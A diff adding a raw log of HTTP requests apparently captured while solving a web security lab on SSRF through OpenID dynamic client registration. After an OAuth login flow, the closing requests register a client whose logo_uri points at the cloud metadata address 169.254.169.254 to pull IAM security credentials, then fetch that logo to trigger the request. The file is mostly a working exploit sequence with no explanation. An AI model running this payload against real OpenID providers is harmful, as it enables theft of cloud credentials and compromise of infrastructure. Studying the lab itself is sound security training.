@@ -1,0 +1,73 @@
+GET /my-account HTTP/1.1
+Host: ac1b1f031ee05397c0122740007600ea.web-security-academy.net
+Cookie: session=hWv1boeUEwU2qLn7uNb3FGPe26mA5Mgx
+
+GET /social-login HTTP/1.1
+Host: ac1b1f031ee05397c0122740007600ea.web-security-academy.net
+Cookie: session=hWv1boeUEwU2qLn7uNb3FGPe26mA5Mgx
+
+GET /auth?client_id=v9o11to1aiqpj3ap1vxku&redirect_uri=https://ac1b1f031ee05397c0122740007600ea.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email HTTP/1.1
+Host: oauth-ac4e1fd11e3c535fc098275a02140021.web-security-academy.net
+
+GET /interaction/CFX8Oqcob52HpGRKNjh4Z HTTP/1.1
+Host: oauth-ac4e1fd11e3c535fc098275a02140021.web-security-academy.net
+Cookie: _interaction=CFX8Oqcob52HpGRKNjh4Z
+
+POST /interaction/CFX8Oqcob52HpGRKNjh4Z/login HTTP/1.1
+Host: oauth-ac4e1fd11e3c535fc098275a02140021.web-security-academy.net
+Cookie: _interaction=CFX8Oqcob52HpGRKNjh4Z
+
+username=wiener&password=peter
+
+GET /auth/CFX8Oqcob52HpGRKNjh4Z HTTP/1.1
+Host: oauth-ac4e1fd11e3c535fc098275a02140021.web-security-academy.net
+Cookie: _interaction_resume=CFX8Oqcob52HpGRKNjh4Z
+
+GET /interaction/CFX8Oqcob52HpGRKNjh4Z HTTP/1.1
+Host: oauth-ac4e1fd11e3c535fc098275a02140021.web-security-academy.net
+Cookie: _interaction=CFX8Oqcob52HpGRKNjh4Z; _session=i1H7gsapgYpwNoVIVHkvg; _session.legacy=i1H7gsapgYpwNoVIVHkvg
+
+GET /client/v9o11to1aiqpj3ap1vxku/logo HTTP/1.1
+Host: oauth-ac4e1fd11e3c535fc098275a02140021.web-security-academy.net
+Cookie: _session=i1H7gsapgYpwNoVIVHkvg; _session.legacy=i1H7gsapgYpwNoVIVHkvg
+
+POST /interaction/CFX8Oqcob52HpGRKNjh4Z/confirm HTTP/1.1
+Host: oauth-ac4e1fd11e3c535fc098275a02140021.web-security-academy.net
+Cookie: _interaction=CFX8Oqcob52HpGRKNjh4Z; _session=i1H7gsapgYpwNoVIVHkvg; _session.legacy=i1H7gsapgYpwNoVIVHkvg
+
+GET /auth/CFX8Oqcob52HpGRKNjh4Z HTTP/1.1
+Host: oauth-ac4e1fd11e3c535fc098275a02140021.web-security-academy.net
+Cookie: _interaction_resume=CFX8Oqcob52HpGRKNjh4Z; _session=i1H7gsapgYpwNoVIVHkvg; _session.legacy=i1H7gsapgYpwNoVIVHkvg
+
+GET /oauth-callback?code=9skcJsgID3yA0TlgAFXOtGUGO02a-IfOqBZxGdGYj08 HTTP/1.1
+Host: ac1b1f031ee05397c0122740007600ea.web-security-academy.net
+Cookie: session=hWv1boeUEwU2qLn7uNb3FGPe26mA5Mgx
+
+GET / HTTP/1.1
+Host: ac1b1f031ee05397c0122740007600ea.web-security-academy.net
+Cookie: session=aOLw6UQ4ZxlfQ0PNpaenlkDS40bc9EAL
+
+GET /logout HTTP/1.1
+Host: ac1b1f031ee05397c0122740007600ea.web-security-academy.net
+Cookie: session=aOLw6UQ4ZxlfQ0PNpaenlkDS40bc9EAL
+
+GET /.well-known/openid-configuration HTTP/1.1
+Host: oauth-ac4e1fd11e3c535fc098275a02140021.web-security-academy.net
+Cookie: _session=GVJEuKONyUbT849m4XT0X; _session.legacy=GVJEuKONyUbT849m4XT0X
+
+POST /reg HTTP/1.1
+Host: oauth-ac4e1fd11e3c535fc098275a02140021.web-security-academy.net
+Cookie: _session=GVJEuKONyUbT849m4XT0X; _session.legacy=GVJEuKONyUbT849m4XT0X
+
+{
+    "application_type": "web",
+    "redirect_uris": [
+        "https://ac1b1f031ee05397c0122740007600ea.web-security-academy.net/callback",
+        "https://ac1b1f031ee05397c0122740007600ea.web-security-academy.net/callback2"
+        ],
+"logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
+}
+
+GET /client/qTWfAfBcyTMRy7O2hwjke/logo HTTP/1.1
+Host: oauth-ac4e1fd11e3c535fc098275a02140021.web-security-academy.net
+Cookie: _session=i1H7gsapgYpwNoVIVHkvg; _session.legacy=i1H7gsapgYpwNoVIVHkvg
